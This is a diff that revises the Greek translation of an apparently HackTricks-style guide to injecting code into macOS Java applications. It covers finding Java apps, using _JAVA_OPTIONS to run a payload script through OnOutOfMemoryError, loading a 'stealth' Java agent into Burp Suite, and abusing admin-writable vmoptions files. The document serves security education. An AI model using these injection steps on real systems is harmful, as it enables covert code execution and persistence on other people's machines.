@@ -4,7 +4,7 @@
 
 ## Enumeration
 
-Βρείτε τις εφαρμογές Java που είναι εγκατεστημένες στο σύστημά σας. Παρατηρήθηκε ότι οι εφαρμογές Java στο **Info.plist** θα περιέχουν κάποιες παραμέτρους java που περιέχουν τη συμβολοσειρά **`java.`**, οπότε μπορείτε να αναζητήσετε αυτό:
+Βρείτε τις Java applications που είναι εγκατεστημένες στο σύστημά σας. Παρατηρήθηκε ότι οι Java apps στο **Info.plist** περιέχουν ορισμένες Java parameters που περιλαμβάνουν το string **`java.`**, επομένως μπορείτε να το αναζητήσετε:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Η μεταβλητή περιβάλλοντος **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για να εισάγει αυθαίρετες παραμέτρους java στην εκτέλεση μιας εφαρμογής που έχει μεταγλωττιστεί σε java:
+Η env μεταβλητή **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για την έγχυση αυθαίρετων παραμέτρων java κατά την εκτέλεση μιας μεταγλωττισμένης εφαρμογής java:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Για να το εκτελέσετε ως νέα διαδικασία και όχι ως παιδί του τρέχοντος τερματικού, μπορείτε να χρησιμοποιήσετε:
+Για να το εκτελέσετε ως νέα διεργασία και όχι ως θυγατρική της τρέχουσας τερματικής συσκευής, μπορείτε να χρησιμοποιήσετε:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Ωστόσο, αυτό θα προκαλέσει ένα σφάλμα στην εκτελούμενη εφαρμογή, ένας άλλος πιο διακριτικός τρόπος είναι να δημιουργήσετε έναν java agent και να χρησιμοποιήσετε:
+Ωστόσο, αυτό θα προκαλέσει ένα error στην app που εκτελείται· ένας πιο stealth τρόπος είναι να δημιουργήσετε ένα java agent και να χρησιμοποιήσετε:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Η δημιουργία του πράκτορα με **διαφορετική έκδοση Java** από την εφαρμογή μπορεί να προκαλέσει κατάρρευση της εκτέλεσης τόσο του πράκτορα όσο και της εφαρμογής
+> Η δημιουργία του agent με **διαφορετική έκδοση Java** από αυτήν της εφαρμογής μπορεί να προκαλέσει crash στην εκτέλεση τόσο του agent όσο και της εφαρμογής
 
-Όπου ο πράκτορας μπορεί να είναι:
+Όπου το agent μπορεί να είναι:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,19 +102,19 @@ err.printStackTrace();
 }
 }
 ```
-Για να μεταγλωττίσετε τον πράκτορα, εκτελέστε:
+Για να κάνετε compile το agent, εκτελέστε:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-Με το `manifest.txt`:
+Με `manifest.txt`:
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Και στη συνέχεια εξάγετε τη μεταβλητή env και εκτελέστε την εφαρμογή java όπως:
+Και στη συνέχεια κάντε export τη μεταβλητή περιβάλλοντος και εκτελέστε την εφαρμογή Java ως εξής:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions αρχείο
+## vmoptions file
 
-Αυτό το αρχείο υποστηρίζει την καθορισμένη **Java params** όταν εκτελείται η Java. Μπορείτε να χρησιμοποιήσετε μερικά από τα προηγούμενα κόλπα για να αλλάξετε τις java params και **να κάνετε τη διαδικασία να εκτελεί αυθαίρετες εντολές**.\
-Επιπλέον, αυτό το αρχείο μπορεί επίσης να **περιλαμβάνει άλλα** με τον κατάλογο `include`, οπότε μπορείτε επίσης να αλλάξετε ένα περιλαμβανόμενο αρχείο.
+Αυτό το αρχείο υποστηρίζει τον καθορισμό των **Java params** κατά την εκτέλεση της Java. Θα μπορούσατε να χρησιμοποιήσετε κάποια από τα προηγούμενα tricks για να αλλάξετε τα java params και να **κάνετε τη διεργασία να εκτελέσει αυθαίρετες εντολές**.\
+Επιπλέον, αυτό το αρχείο μπορεί επίσης να **συμπεριλάβει άλλα** με τον κατάλογο `include`, επομένως θα μπορούσατε επίσης να αλλάξετε ένα συμπεριλαμβανόμενο αρχείο.
 
-Ακόμα περισσότερο, ορισμένες εφαρμογές Java θα **φορτώσουν περισσότερα από ένα `vmoptions`** αρχείο.
+Ακόμη περισσότερο, ορισμένες Java apps θα **φορτώσουν περισσότερα από ένα αρχεία `vmoptions`**.
 
-Ορισμένες εφαρμογές όπως το Android Studio υποδεικνύουν στην **έξοδό τους πού ψάχνουν** για αυτά τα αρχεία, όπως:
+Ορισμένες εφαρμογές, όπως το Android Studio, υποδεικνύουν στο **output πού αναζητούν** αυτά τα αρχεία, όπως:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Σημειώστε πόσο ενδιαφέρον είναι ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το αρχείο **`/Applications/Android Studio.app.vmoptions`**, ένα μέρος όπου οποιοσδήποτε χρήστης από την **`admin` ομάδα έχει δικαίωμα εγγραφής.** 
+Σημειώστε πόσο ενδιαφέρον είναι ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το αρχείο **`/Applications/Android Studio.app.vmoptions`**, μια τοποθεσία όπου οποιοσδήποτε χρήστης από την ομάδα **`admin` έχει δικαιώματα εγγραφής.**
 
 {{#include ../../../banners/hacktricks-training.md}}
